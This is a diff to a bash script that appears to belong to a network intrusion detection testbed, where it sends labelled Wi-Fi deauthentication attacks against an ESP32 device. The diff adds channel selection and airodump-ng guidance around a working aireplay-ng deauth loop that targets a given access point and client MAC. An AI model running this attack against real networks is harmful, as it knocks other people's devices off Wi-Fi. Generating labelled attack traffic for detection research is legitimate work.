@@ -1,9 +1,13 @@
 #!/usr/bin/env bash
 # Deauth attack + labeling (Kali / monitor mode).
-# Usage: sudo ./host/attacks/attack_deauth.sh
+# Usage: sudo -E ./host/attacks/attack_deauth.sh
 #
-# If wlan0mon is missing, runs prepare_wifi.sh monitor first (old set_wifi.sh).
-# After this attack, run: sudo ./host/attacks/prepare_wifi.sh managed
+# Channel/BSSID must match airodump (phone hotspots move often):
+#   sudo airodump-ng wlan0mon --essid 302
+#   export NIDS_BSSID='..' NIDS_WIFI_CHANNEL=N
+#   sudo -E ./host/attacks/attack_deauth.sh
+#
+# After this attack, run: sudo -E ./host/attacks/prepare_wifi.sh managed
 # before SYN / ARP.
 set -euo pipefail
 DIR="$(cd "$(dirname "$0")" && pwd)"
@@ -26,10 +30,29 @@ else
   }
 fi
 
+# Channel: env > live_state > leave iface as-is
+_LIVE_CH="$(_json_field channel 2>/dev/null || true)"
+if [[ -n "${NIDS_WIFI_CHANNEL:-}" ]]; then
+  CHANNEL="$NIDS_WIFI_CHANNEL"
+elif [[ -n "${_LIVE_CH}" && "${_LIVE_CH}" != "null" && "${_LIVE_CH}" != "0" ]]; then
+  CHANNEL="${_LIVE_CH}"
+else
+  CHANNEL=""
+fi
+
+if [[ -n "$CHANNEL" ]]; then
+  echo ">>> Setting ${MON_IFACE} to channel ${CHANNEL}"
+  iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null \
+    || iwconfig "$MON_IFACE" channel "$CHANNEL" 2>/dev/null \
+    || echo ">>> WARN: could not set channel ${CHANNEL}" >&2
+fi
+
 echo ">>> Target ESP32 MAC : $TARGET_MAC"
 echo ">>> AP BSSID         : $BSSID"
+echo ">>> Channel          : ${CHANNEL:-?(set NIDS_WIFI_CHANNEL from airodump)}"
 echo ">>> Monitor iface    : $MON_IFACE"
 echo ">>> READY FOR DEAUTH"
+echo ">>> Tip: if 'No such BSSID', re-run airodump and export matching BSSID+channel"
 
 send_label START DEAUTH
 sleep 0.5
@@ -38,6 +61,10 @@ batch=10
 repeats=5
 for ((i=1; i<=repeats; i++)); do
   echo ">>> Batch ${i}/${repeats}: ${batch} deauth frames"
+  # Re-assert channel each batch — some drivers drift after aireplay waits
+  if [[ -n "$CHANNEL" ]]; then
+    iw dev "$MON_IFACE" set channel "$CHANNEL" 2>/dev/null || true
+  fi
   aireplay-ng -0 "$batch" -a "$BSSID" -c "$TARGET_MAC" "$MON_IFACE"
   sleep 0.5
 done
@@ -45,4 +72,4 @@ done
 sleep 1
 send_label STOP DEAUTH
 echo " >>> ATTACK FINISHED"
-echo " >>> Next for SYN/ARP: sudo ./host/attacks/prepare_wifi.sh managed"
+echo " >>> Next for SYN/ARP: sudo -E ./host/attacks/prepare_wifi.sh managed"
